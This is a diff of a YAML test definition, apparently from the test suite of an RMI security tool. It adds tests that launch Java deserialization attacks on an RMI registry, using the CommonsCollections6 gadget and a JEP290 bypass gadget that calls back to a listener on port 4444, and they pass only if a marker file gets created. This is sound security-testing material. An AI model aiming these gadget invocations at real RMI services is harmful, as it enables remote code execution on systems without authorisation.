@@ -1,30 +1,107 @@
 tester:
-  name: reg
   title: Registry Tests
-  description: >
-    "Performs tests on remote-methods-guessers 'reg' action."
+  description: |-
+    'Perform tests for the serial action on an RMI registry endpoint.'
+
+  id: '001-010'
+  groups:
+    - reg
+    - serial
+  id_pattern: '001-010-{:03}'
+
 
 variables:
-  file: reg-rce-test.txt
+  file: reg-bypass.txt
+
+
+plugins:
+  - os_command:
+      init: 1
+      background: True
+      cmd:
+        - rmg
+        - 0.0.0.0
+        - 4444
+        - listen
+        - CommonsCollections6
+        - 'touch ${volume-d}/${file}'
+
 
 tests:
   - title: Gadget Call
-    description: >
+    description: |-
       'Attempts a deserialization attack on the registry endpoint.'
-      'This should work, as the server runs a legacy version of Java.'
+
+    groups:
+      - ysoserial
 
     command: '${BASE-CMD}'
     arguments:
-      - reg
+      - serial
       - CommonsCollections6
       - 'touch ${volume-d}/${file}'
+      - --component
+      - reg
     validators:
       - error: False
       - contains:
           values:
-            - Caught ClassCastException
-            - probably successful
+            - Caught ClassCastException during deserialization attack
+            - Deserialization attack was probably successful
       - file_exists:
           cleanup: True
           files:
             - '${volume}/${file}'
+
+
+  - title: Gadget Call (SSL)
+    description: |-
+      'Attempts a deserialization attack on the registry endpoint.'
+
+    groups:
+      - ysoserial
+
+    command: '${BASE-CMD-SSL}'
+    arguments:
+      - serial
+      - CommonsCollections6
+      - 'touch ${volume-d}/${file}'
+      - --component
+      - reg
+    validators:
+      - error: False
+      - contains:
+          values:
+            - Caught ClassCastException during deserialization attack
+            - Deserialization attack was probably successful
+      - file_exists:
+          cleanup: True
+          files:
+            - '${volume}/${file}'
+
+
+  - title: JEP290 Bypass
+    description: |-
+      'Attempts a deserialization attack on the registry endpoint,'
+      'using the An Trinh bypass gadget.'
+
+    groups:
+      - ysoserial
+
+    command: '${BASE-CMD-SSL}'
+    arguments:
+      - serial
+      - AnTrinh
+      - ${DOCKER-GW}:4444
+      - --component
+      - reg
+    validators:
+      - error: False
+      - contains:
+          values:
+            - BadAttributeValueExpException
+            - worked anyway
+      - file_exists:
+          cleanup: True
+          files:
+            - ${volume}/${file}
